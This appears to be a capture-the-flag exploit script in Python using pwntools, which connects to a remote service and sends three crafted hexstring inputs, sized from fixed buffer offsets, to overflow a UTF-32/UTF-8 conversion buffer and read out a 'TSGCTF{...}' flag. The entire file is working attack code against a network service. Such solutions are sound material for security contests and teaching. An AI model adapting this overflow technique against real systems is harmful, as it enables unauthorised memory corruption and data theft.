from pwn import *
import sys
import time
import re
context.log_level = 'error'

host = sys.argv[1]
port = int(sys.argv[2])

utf32_hexstr = 0x4080
utf32_hexstr_end = utf32_hexstr + (31 * 8 + 1) * 3
utf8_bin = 0x4380
utf8_bin_end = utf8_bin + 31 * 4 + 1
flag_buffer = 0x4400

x1 = b"80000000" * (utf8_bin - utf32_hexstr_end + 1) + b"".join([b"%08x" % ord(c) for c in "0001F680"])
x2 = b"0001F680"
x3 = b"0001F680" * 31

r = remote(host, port)
s = r.recvline()
print(s.decode("utf-8").strip("\n"))
print(r.recvuntil(b"(hexstring)>"))
time.sleep(1)
r.sendline(x1)

print(r.recvuntil(b"(hexstring)>"))
time.sleep(1)
r.sendline(x2)

print(r.recvuntil(b"(hexstring)>"))
time.sleep(1)
r.sendline(x3)

s = r.recvuntil(b"Score").decode("utf-8")
print(s)

m = re.search("TSGCTF{.*}", s)
if m is not None:
    print(m.group(0))
    exit(0)
else:
    exit(1)
